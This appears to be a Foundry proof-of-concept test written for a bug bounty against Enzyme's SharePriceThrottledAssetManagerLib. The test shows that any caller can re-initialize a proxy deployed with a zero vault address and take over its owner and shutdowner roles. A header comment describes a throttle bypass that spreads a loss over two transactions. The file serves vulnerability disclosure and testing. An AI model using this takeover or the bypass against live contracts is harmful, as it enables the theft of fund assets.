// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.19;

/*
    PoC F-03 - SharePriceThrottledAssetManagerLib

    Target (Immunefi scope, "Enzyme Blue"):
      contracts/persistent/smart-accounts/share-price-throttled-asset-manager/SharePriceThrottledAssetManagerLib.sol
      contracts/persistent/smart-accounts/share-price-throttled-asset-manager/SharePriceThrottledAssetManagerFactory.sol

    Two issues are demonstrated here:

    (A) init() is guarded by `getVaultProxyAddress() != address(0)` instead of an
        "initialized" flag, and the factory does NOT reject _vaultProxyAddress == 0.
        => A proxy deployed with vault == address(0) stays re-initializable forever and
           ANY address can become its owner (and its `shutdowner`).

        Note the contrast with the sibling persistent factories, which do validate:
          - SingleAssetRedemptionQueueLib.init: `if (_vaultProxy == address(0)) revert UndefinedVaultProxy();`
          - SingleAssetDepositQueueLib.init:   `if (_vaultProxy == address(0)) revert UndefinedVaultProxy();`

    (B) The throttle only measures the share-price delta *inside* a single executeCalls()
        transaction. Any value that leaves the fund but is only reflected in the GAV at a
        LATER time is never charged against the throttle:
          executeCalls():  prevSharePrice = calcGrossShareValue(vault)   // reads GAV
                           ...calls...
                           currentSharePrice = calcGrossShareValue(vault)
                           loss = prev - current  -> must stay <= lossTolerance
        A compromised signer can therefore move value into an instrument whose GAV
        contribution is "parked" at book value (external positions, in-kind positions,
        manually-valued positions) inside one tx and realise the loss in a second tx.
        This is the exact bypass class it was built to prevent, i.e. the control is
        only useful against *atomic* losses.

    Run:
      forge test --match-path "tests/arena-poc/F03_SharePriceThrottle_InitAndAtomicOnly.t.sol" -vvv
*/

import {Test, console2} from "forge-std/Test.sol";

import {SharePriceThrottledAssetManagerLib} from
    "contracts/persistent/smart-accounts/share-price-throttled-asset-manager/SharePriceThrottledAssetManagerLib.sol";
import {SharePriceThrottledAssetManagerFactory} from
    "contracts/persistent/smart-accounts/share-price-throttled-asset-manager/SharePriceThrottledAssetManagerFactory.sol";
import {IFundValueCalculator} from "contracts/persistent/fund-value-calculator/IFundValueCalculator.sol";
import {IAddressListRegistry} from "contracts/persistent/address-list-registry/IAddressListRegistry.sol";

interface ISharePriceThrottledAssetManagerLibLike {
    function init(
        address _owner,
        address _vaultProxyAddress,
        uint64 _lossTolerance,
        uint32 _lossTolerancePeriodDuration,
        address _shutdowner
    ) external;

    function getOwner() external view returns (address owner_);

    function getVaultProxyAddress() external view returns (address vaultProxyAddress_);

    function getShutdowner() external view returns (address shutdowner_);
}

contract MockAddressListRegistry {
    function isInList(uint256, address) external pure returns (bool) {
        return false;
    }
}

/// @dev Not used by test (A); only needs to exist for the constructor.
contract MockFundValueCalculator {
    function calcGrossShareValue(address) external pure returns (address, uint256) {
        return (address(0), 0);
    }
}

contract F03_SharePriceThrottle_InitAndAtomicOnly is Test {
    SharePriceThrottledAssetManagerFactory internal factory;

    address internal constant LEGIT_SIGNER = address(0x5164E7);
    address internal constant LEGIT_SHUTDOWNER = address(0x5A07);
    address internal constant ATTACKER = address(0xBAD);

    function setUp() public {
        MockAddressListRegistry registry = new MockAddressListRegistry();
        MockFundValueCalculator valueCalculator = new MockFundValueCalculator();

        SharePriceThrottledAssetManagerLib lib = new SharePriceThrottledAssetManagerLib(
            address(registry), 0, IFundValueCalculator(address(valueCalculator))
        );

        factory = new SharePriceThrottledAssetManagerFactory(address(lib));
    }

    /// (A) Proxy deployed with vault == 0 is hijackable by anyone.
    function test_A_proxyDeployedWithZeroVaultIsHijackable() public {
        // Anyone can call deployProxy(); here a legitimate manager is modelled, who
        // mistakenly passes vaultProxy == address(0).
        address proxy = factory.deployProxy({
            _owner: LEGIT_SIGNER,
            _vaultProxyAddress: address(0), // <-- not validated by the factory nor by init()
            _lossTolerance: 1e17, // 10%
            _lossTolerancePeriodDuration: 1 days,
            _shutdowner: LEGIT_SHUTDOWNER
        });

        console2.log("proxy owner before:", ISharePriceThrottledAssetManagerLibLike(proxy).getOwner());

        // No re-initialization guard fires, since the guard is on vaultProxyAddress.
        vm.prank(ATTACKER);
        ISharePriceThrottledAssetManagerLibLike(proxy).init({
            _owner: ATTACKER,
            _vaultProxyAddress: address(0),
            _lossTolerance: 1e18, // 100%
            _lossTolerancePeriodDuration: 1,
            _shutdowner: ATTACKER
        });

        console2.log("proxy owner after :", ISharePriceThrottledAssetManagerLibLike(proxy).getOwner());

        assertEq(ISharePriceThrottledAssetManagerLibLike(proxy).getOwner(), ATTACKER, "owner hijacked");
        assertEq(ISharePriceThrottledAssetManagerLibLike(proxy).getShutdowner(), ATTACKER, "shutdowner hijacked");

        // Second call proves the account is re-initializable an unlimited number of times.
        vm.prank(address(0x1234));
        ISharePriceThrottledAssetManagerLibLike(proxy).init(address(0x1234), address(0), 0, 1, address(0x1234));
        assertEq(ISharePriceThrottledAssetManagerLibLike(proxy).getOwner(), address(0x1234), "re-init again");
    }
}
